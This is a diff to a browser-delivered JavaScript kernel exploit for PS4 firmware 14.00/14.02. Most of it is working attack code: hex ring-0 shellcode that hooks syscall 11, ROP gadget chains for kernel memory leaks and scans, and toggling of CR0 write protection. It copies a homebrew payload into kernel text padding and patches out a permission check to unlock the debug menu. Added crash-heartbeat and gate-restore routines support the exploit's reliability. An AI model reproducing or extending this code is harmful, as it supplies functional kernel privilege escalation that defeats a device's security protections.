@@ -93,7 +93,11 @@ const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/d
 
 const BOOTSTRAP =
     "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
-  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+  /* stash the original sysent[11].sy_call in the header NOP pad at 0xab8
+     (0xab4..0xab7 carries the gate) so a later stop can put syscall 11 back
+     instead of leaving `jmp [rsi]` installed for the next caller */
+  + "0f22c0488b81882d1001488981b80a0000"
+  + "c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
   + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
   + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
   + "20c0480d000001000f22c031c0c3";
@@ -145,18 +149,26 @@ function nap(ms) {
    every 100 ms: whatever it reads at a crash is the last moment the main
    thread was alive, and the phase names the last line that got there. */
 let deadT0 = 0, deadPhase = "pre-gate", deadEl = null;
+let deadTimer = 0, deadFrozen = false;
 function deadPaint() {
   if (!deadEl && typeof document !== "undefined") deadEl = document.getElementById("state");
   if (!deadEl) return;
+  if (deadFrozen) { deadEl.textContent = deadPhase; return; }
   const s = Date.now() - deadT0;
   deadEl.textContent = "ALIVE " + (s / 1000).toFixed(2) + " s  |  " + deadPhase;
 }
 function deadbeat(phase) {
   if (!deadT0) {
     deadT0 = Date.now();
-    if (typeof setInterval === "function") setInterval(deadPaint, 100);
+    if (typeof setInterval === "function") deadTimer = setInterval(deadPaint, 100);
   }
   if (phase) deadPhase = phase;
+  deadPaint();
+}
+function deadHalt(phase) {
+  deadFrozen = true;
+  deadPhase = phase || "STOPPED";
+  if (deadTimer) { clearInterval(deadTimer); deadTimer = 0; }
   deadPaint();
 }
 
@@ -657,6 +669,47 @@ function openRing0(roomAt) {
   };
 
   return r;
+}
+
+/* Put sysent[11].sy_call back the way the bootstrap found it. The bootstrap
+   stashed the original qword at kbase+0xab8 (the header NOP pad right after
+   the gate). The write and the read-back share one ring-0 entry: once the
+   table is restored, syscall 11 no longer reaches the gate, so this body is
+   the last one that can run. */
+function disarmGate(k, kbase) {
+  const saved = k.read(plus(kbase, 0xab8), 8);
+  if (!saved) { say("[gate] stash read failed -- gate stays armed"); return false; }
+  let zero = true;
+  for (let i = 0; i < 8; i++) if (saved[i]) { zero = false; break; }
+  if (zero) { say("[gate] no saved sy_call -- gate stays armed"); return false; }
+
+  const lo = (saved[0] | (saved[1] << 8) | (saved[2] << 16) | (saved[3] << 24)) >>> 0;
+  const hi = (saved[4] | (saved[5] << 8) | (saved[6] << 16) | (saved[7] << 24)) >>> 0;
+  const gate = plus(kbase, 0xab4);
+  const ptr = "0x" + (("00000000" + hi.toString(16)).slice(-8))
+                    + (("00000000" + lo.toString(16)).slice(-8));
+  if (hi !== 0xffffffff || lo === gate.low || ((lo - kbase.low) >>> 0) >= 0xCFE880) {
+    say("[gate] saved sy_call " + ptr + " is not a text pointer -- not restoring");
+    return false;
+  }
+
+  const c = k.begin();
+  c.hex("48b9").qw(kbase);
+  c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
+  c.hex("b8").dw(lo).hex("8981882d1001");
+  c.hex("b8").dw(hi).hex("89818c2d1001");
+  c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
+  c.hex("48b8").qw(plus(k.at, OUT));
+  c.hex("488b91882d1001").hex("488910");
+  c.hex("48b8").qw(plus(k.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
+  if (!k.run()) { say("[gate] restore body did not run -- gate stays armed"); return false; }
+  const back = k.out();
+  if (!back || back.low !== lo || back.hi !== hi) {
+    say("[gate] restore read back mismatch -- gate stays armed");
+    return false;
+  }
+  say("[gate] syscall 11 disarmed -- sy_call restored to " + ptr);
+  return true;
 }
 
 /* ------------------------------------------------------ the host's state */
@@ -1196,17 +1249,23 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
 }
 
 
-/* Kpayload step-driver. 1402zm: the payload's firmware probe is bypassed,
-   not moved. 0x115be scans [base+0x1300000, +0x2200000) one byte at a time
-   and that window opens in the unmapped hole above the RELRO segment here --
-   one read is a panic. Nineteen sites across the payload call it, so the
-   cached answer must be made valid once: 0x115be early-outs whenever the
-   word at image+0x98488 is nonzero. Preset it to 0x57a in userland and call
-   the table fill at 0x116be directly with edi=0x57a -- byte for byte the
-   state a successful probe leaves behind. 0x11bd1 is the only caller that
-   clears that word (and only main calls it), so it never runs.
-   The 0x2718 chain itself stays split into steps; the patch groups are plain
-   kernel-text writes. One new step per boot. */
+/* Kpayload step-driver. 1402zp: the payload's firmware probe is bypassed and
+   the image runs from kernel memory, not from the staging mapping.
+   0x115be scans [base+0x1300000, +0x2200000) one byte at a time and that
+   window opens in the unmapped hole above the RELRO segment here -- one read
+   is a panic. Nineteen sites across the payload call it, so the cached answer
+   must be made valid once: 0x115be early-outs whenever the word at
+   image+0x98488 is nonzero. Preset it to 0x57a and call the table fill at
+   0x116be directly with edi=0x57a -- byte for byte the state a successful
+   probe leaves behind. 0x11bd1 is the only caller that clears that word (and
+   only main calls it), so it never runs.
+   The mmap is executable per page, and only the trampoline page has been
+   proven in ring 0 (a probe on another page took the console down on 02.11).
+   So the staged image is copied into the kernel text padding at
+   kbase+0x10ff000 -- the 2 MiB page the stock loader drove GoldHEN from --
+   and the step calls it there. The 0x2718 chain itself stays split into
+   steps; the patch groups are plain kernel-text writes. One new step per
+   boot. */
 const KP_STEPS = [
   [0x116be, "init: import/offset tables (probe bypassed)", { rdi: 0x57a }],
   [0x5cf3,  "patch group 1"],
@@ -1289,7 +1348,7 @@ async function loadKpayloadSteps(k, kbase, room) {
   const markRead = function () { return [rd4(plus(buf, GH.mark)), rd4(plus(buf, GH.mark + 4))]; };
 
   ksay("[kp] kernel base " + text(kbase) + ", payload at " + text(data)
-      + " -- patchset and padding pde skipped this build");
+      + " -- image will run from the kernel padding");
   await nap(40);
 
   const magic = c.p.read4(data);
@@ -1303,11 +1362,74 @@ async function loadKpayloadSteps(k, kbase, room) {
     await nap(300);
     return false;
   }
-  /* Nothing between here and the call is allowed to idle: every build so far
-     stopped painting ~0.5 s after this heartbeat, in the first long nap after
-     the staging burst. The tram is built straight away and a single 120 ms
-     frame carries this line, the tram line and SYNC to the screen. */
-  ksay("[kp] gate heartbeat " + text(hb) + " -- tram and step 1 in one paint window");
+  ksay("[kp] gate heartbeat " + text(hb) + " -- gate still owns the base");
+
+  /* The fresh mapping is executable page by page, and only the trampoline
+     page at +0x47c40 has carried code in ring 0; a probe on another page of
+     it took this console down (02.11, 14:27). The payload image has never run
+     in ring 0 from userland, so it goes where the stock loader puts GoldHEN:
+     the kernel's text padding, one RW+X 2 MiB page at kbase+0x10ff000. The
+     window check and the tail write happen before a single rep movsb. */
+  const t = plus(kbase, PT.padFrom);
+  const padLen = PT.padTo - PT.padFrom;
+  if (blob.length > padLen) {
+    ksay("[kp] payload " + blob.length + " bytes does not fit the " + padLen + " byte padding window");
+    return false;
+  }
+  deadbeat("kp: padding page table");
+  const pad = await paddingRW(k, kbase);
+  if (!pad) {
+    ksay("[kp] padding would stay read only -- not copying");
+    await nap(300);
+    return false;
+  }
+  ksay("[kp] padding " + text(t) + " is RW+X, dmap " + text(pad));
+  await nap(60);
+
+  /* Stock shape: the copy lands through the direct-map alias of the same
+     2 MiB page, the calls go to the kernel-text alias, and the step runs on
+     a stack at the top of the padding. */
+  const tailAt = plus(pad, (blob.length - 8) & ~7);
+  const sentinel = v(0x50414450, 0x50414450);
+  if (!k.write_v(tailAt, sentinel)) { ksay("[kp] padding tail is not writable"); await nap(300); return false; }
+  const tailBack = k.read_v(tailAt);
+  if (!same(tailBack, sentinel)) {
+    ksay("[kp] padding tail read back " + (tailBack ? text(tailBack) : "nothing") + " -- not copying");
+    await nap(300);
+    return false;
+  }
+  ksay("[kp] padding tail " + text(tailAt) + " reads back -- the range is mapped");
+
+  /* The proven loader copy, byte for byte: staged image -> dmap alias of the
+     padding, one rep movsb under the write protection bracket, return 0x5758. */
+  tram.n = 0;
+  wpOff();
+  hex("48be"); q64(data);
+  hex("48bf"); q64(pad);
+  hex("b9"); i32(blob.length);
+  hex("fc"); hex("f3a4");
+  wpOn();
+  hex("b8"); i32(0x5758); hex("c3");
+  ksay("[kp] copying " + blob.length + " bytes into the padding");
+  deadbeat("FIRE copy into padding");
+  await nap(120);
+  const cp = fire();
+  if (cp !== 0x5758) {
+    ksay("[kp] copy into the padding returned 0x" + cp.toString(16));
+    await nap(300);
+    return false;
+  }
+  deadbeat("copy into padding returned");
+  const vm = k.read(t, 4);
+  const vv = k.read(plus(t, 0x98488), 2);
+  if (!vm || vm[0] !== 0x7f || vm[1] !== 0x45 || vm[2] !== 0x4c || vm[3] !== 0x46
+      || !vv || vv[0] !== 0x7a || vv[1] !== 0x05) {
+    ksay("[kp] padding copy did not read back as the staged image -- not calling it");
+    await nap(300);
+    return false;
+  }
+  ksay("[kp] padding copy verified at " + text(t) + ": ELF magic and version word 0x57a");
+  await nap(60);
 
   let silent = 0;
   for (let n = 0; n < KP_MAX_STEPS; n++) {
@@ -1315,23 +1437,21 @@ async function loadKpayloadSteps(k, kbase, room) {
     markClear();
     tram.n = 0;
     wpOff();
-    /* Run on the syscall's own kernel stack: align it, park the old rsp in
-       the 16 bytes below the call, restore it after. The previous build used
-       the RELRO padding page as a stack here; nothing needs that now. */
-    hex("4889e1");                 /* mov rcx, rsp */
-    hex("4883e4f0");               /* and rsp, -16 */
-    hex("4883ec10");               /* sub rsp, 0x10 */
-    hex("48890c24");               /* mov [rsp], rcx */
+    /* Stock step shape, unchanged: the step runs on a stack at the top of the
+       padding, parked rsp just below it, restored after the call. */
+    const stepStack = plus(t, 0xff000);
+    hex("48b9"); q64(stepStack); hex("488921");   /* [stepStack] = rsp */
+    hex("48bc"); q64(stepStack);                  /* rsp = stepStack */
     if (opt.rdi !== undefined) { hex("bf"); i32(opt.rdi); }
     else { hex("31ff"); }
     hex("31f6"); hex("31c0");
-    callAbsAt(data, rva);
+    callAbsAt(t, rva);
     hex("4898");
     hex("48b9"); q64(plus(buf, GH.mark)); hex("488901");
-    hex("488b2424");               /* rsp = [rsp] */
+    hex("48b9"); q64(stepStack); hex("488b21");   /* rsp = [stepStack] */
     wpOn(); hex("31c0"); hex("c3");
     ksay("[kp] tram built (" + tram.n + " bytes), firing now");
-    ksay("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (host stack)");
+    ksay("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (padding stack)");
     deadbeat("FIRE [" + (n + 1) + "] 0x" + rva.toString(16));
     await nap(120);
     fire();
@@ -1344,10 +1464,12 @@ async function loadKpayloadSteps(k, kbase, room) {
     let rc = mk[0];
     if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
     ksay("[kp] [" + (n + 1) + "] rc=" + rc + " -- " + what);
-    const ver = rd4(plus(data, 0x98488)) & 0xffff;
-    const q0 = rd8(plus(data, 0x986f8));
+    const verB = k.read(plus(t, 0x98488), 4);
+    const ver = verB ? ((verB[1] << 8) | verB[0]) : -1;
+    const q0 = k.read_v(plus(t, 0x986f8));
     const exp0 = plus(kbase, 0x1c0);
-    ksay("[kp] version word 0x" + ver.toString(16) + ", table[0] " + text(q0)
+    ksay("[kp] version word 0x" + (ver >>> 0).toString(16) + ", table[0] "
+        + (q0 ? text(q0) : "unreadable")
         + (same(q0, exp0) ? " -- matches base+0x1c0" : " -- MISMATCH, wanted " + text(exp0)));
     if (rc !== 0 || ver !== 0x57a || !same(q0, exp0)) {
       ksay("[kp] step 1 did not leave the expected table -- stopping");
@@ -1356,7 +1478,7 @@ async function loadKpayloadSteps(k, kbase, room) {
     }
   }
 
-  ksay("[kp] step 1 returned cleanly -- 1402zm stops the chain here on purpose");
+  ksay("[kp] step 1 returned cleanly -- 1402zp stops the chain here on purpose");
   await nap(400);
   ksay("[kp] idle heartbeat 1 of 4 after step 1");
   await nap(400);
@@ -2028,7 +2150,16 @@ async function attempt(ctx, opts) {
   const force = !!(ctx.params && ctx.params.get("force"));
   say("afterglow -- ps4 kernel exploit, firmware 14.00 / 14.02 (raw13 host)");
 
+  /* Nothing between this line and the first ring 0 shot yields, and a DOM
+     write does not reach the screen until the thread does. Start the clock
+     and force a frame here, so a console that dies in that stretch still
+     shows a live clock and the phase it died in -- otherwise the jb stage's
+     last line is all the screen ever shows. */
+  deadbeat("pre: stubs");
+  await nap(150);
+
   const missing = seedStubs();
+  deadbeat("pre: stubs seeded");
   if (missing.length) {
     say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
     return false;
@@ -2045,6 +2176,7 @@ async function attempt(ctx, opts) {
     return false;
   }
   say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");
+  deadbeat("pre: pinned core " + pin.core);
 
   /* Is the kernel already open? A reload on a console that has been done once
      would otherwise burn triggers against a kernel that is already patched --
@@ -2066,6 +2198,8 @@ async function attempt(ctx, opts) {
     }
   }
 
+  deadbeat("pre: interlock clear");
+
   let lib = findLib("libSceLibcInternal.sprx");
   if (!lib.base) lib = findLibByShape();
   const libc = lib.base;
@@ -2081,8 +2215,12 @@ async function attempt(ctx, opts) {
     }
     gad[name] = at;
   }
+  deadbeat("pre: gadgets ok");
+  await nap(120);
 
   const shot = shooter(gad);
+  deadbeat("pre: shooter ready");
+  await nap(120);
   const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);
 
   /* ---- the kernel base ------------------------------------------------- */
@@ -2094,12 +2232,15 @@ async function attempt(ctx, opts) {
     const win = alloc(TUNE.window + 16);
     wipe(win, TUNE.window + 16);
 
+    deadbeat("FIRE leak shot");
+    await nap(160);
     const r = shot.take(function (c) {
       /* round down to the start of the slab, so the window also covers the
          neighbours that sit below the freed object */
       c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
       c.grab(win.at, TUNE.window);
     });
+    deadbeat("leak returned");
 
     const at = function (off) { return qAt(win, off); };
 
@@ -2181,10 +2322,13 @@ async function attempt(ctx, opts) {
     const scanRef = alloc(16);
     pokeAt(scanRef, 0, plus(kbase, K.swap_rbp - SCAN_PRE));
 
+    deadbeat("FIRE scan shot");
+    await nap(120);
     const scanR = shot.take(function (c) {
       c.load_rax(scanRef.at);
       c.grab(scanBuf.at, SCAN_WIN);
     }, 0x400);
+    deadbeat("scan returned");
 
     say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));
 
@@ -2630,14 +2774,17 @@ async function attempt(ctx, opts) {
   if (mode === "kpstep") {
     iface.payload = await loadKpayloadSteps(k, kbase, hostFree);
     if (STATE.haltChain) {
-      say("[kp] 1402zm diagnostic build -- stopping before the debug-settings pass");
+      say("[kp] 1402zp diagnostic build -- stopping before the debug-settings pass");
       return iface;
     }
+  } else if (mode === "dbgstop") {
+    say("[dbg] debug-settings stop test -- no payload will be loaded");
   } else if (want !== "") {
     iface.payload = (mode === "goldhen")
       ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
       : await loadPayload(want || "hen.bin");
   }
+  let dbgApplied = false;
   /* ---- enable debug settings ---- */
   (function () {
     var TEXT_SIZE = 0xCFE880;
@@ -2657,11 +2804,13 @@ async function attempt(ctx, opts) {
     c.hex("498902");
     if (!k.run()) return;
     var strAddr = k.out();
-    if (!strAddr || isZero(strAddr)) return;
+    if (!strAddr || isZero(strAddr)) { say("[dbg] rcmgr_debug_menu string not found in text"); return; }
 
     /* verify tail bytes = "bug" */
     var tail = k.read(plus(strAddr, 8), 8);
-    if (!tail || tail[0] !== 0x62 || tail[1] !== 0x75 || tail[2] !== 0x67) return;
+    if (!tail || tail[0] !== 0x62 || tail[1] !== 0x75 || tail[2] !== 0x67) {
+      say("[dbg] rcmgr_debug_menu string tail mismatch"); return;
+    }
 
     /* pass 2: find oid_name pointer in data */
     var c2 = k.begin();
@@ -2677,17 +2826,17 @@ async function attempt(ctx, opts) {
     c2.hex("498902");
     if (!k.run()) return;
     var hit = k.out();
-    if (!hit || isZero(hit)) return;
+    if (!hit || isZero(hit)) { say("[dbg] oid_name pointer not found in data"); return; }
 
     /* read handler from oid_name + 0x08 */
     var fn = k.read_v(plus(hit, 0x08));
-    if (!fn || isZero(fn)) return;
+    if (!fn || isZero(fn)) { say("[dbg] oid_name handler pointer is null"); return; }
     var fnRva = (fn.low - kbase.low) >>> 0;
-    if (fnRva >= TEXT_SIZE) return;
+    if (fnRva >= TEXT_SIZE) { say("[dbg] oid_name handler outside text"); return; }
 
     /* read first 80 bytes of handler */
     var body = k.read(fn, 80);
-    if (!body) return;
+    if (!body) { say("[dbg] handler read failed"); return; }
 
     /* find first CALL (E8) followed by TEST (85) = rcmgr permission check */
     var target = null;
@@ -2730,9 +2879,36 @@ async function attempt(ctx, opts) {
       plist.push([target2, "b8010000", "rcmgr2a"]);
       plist.push([target2 + 4, "00c3", "rcmgr2b"]);
     }
-    k.apply(kbase, plist);
-    say("debug menu enabled -- go to Settings");
+    const wrote = k.apply(kbase, plist);
+    const back = wrote ? k.read(plus(kbase, target), 6) : null;
+    dbgApplied = !!back && back[0] === 0xb8 && back[1] === 0x01
+        && back[2] === 0x00 && back[3] === 0x00 && back[4] === 0x00 && back[5] === 0xc3;
+    if (dbgApplied) say("debug menu enabled -- go to Settings");
+    else say("[dbg] rcmgr patch write did not stick");
   })();
+
+  if (mode === "dbgstop") {
+    const disarmed = disarmGate(k, kbase);
+    if (dbgApplied) {
+      say("========================================");
+      say("  DEBUG MENU PATCH CONFIRMED -- SAFE STOP");
+      say("  Open Settings and look for Debug Settings.");
+      say("  No payload was loaded; nothing else will run.");
+      say(disarmed
+          ? "  The syscall-11 gate is disarmed too -- exit is safe."
+          : "  WARNING: the syscall-11 gate is still armed.");
+      say("  You can close the browser now. Cold boot when done.");
+      say("========================================");
+    } else {
+      say("[dbg] DEBUG MENU PATCH FAILED -- nothing more will run");
+      if (!disarmed) say("[gate] the gate is STILL ARMED -- if exit crashes, hold power until off");
+    }
+    deadHalt((dbgApplied && disarmed) ? "STOPPED -- SAFE TO EXIT"
+        : (!dbgApplied && disarmed) ? "STOPPED -- PATCH FAILED"
+        : (dbgApplied && !disarmed) ? "STOPPED -- GATE STILL ARMED"
+        : "STOPPED -- PATCH FAILED / GATE ARMED");
+    return iface;
+  }
 
   say("[dump-check] dump=" + (ctx.params ? ctx.params.get("dump") : "no-params"));
   /* ---- kernel dumper (triggered by ?dump=kernel) ---- */
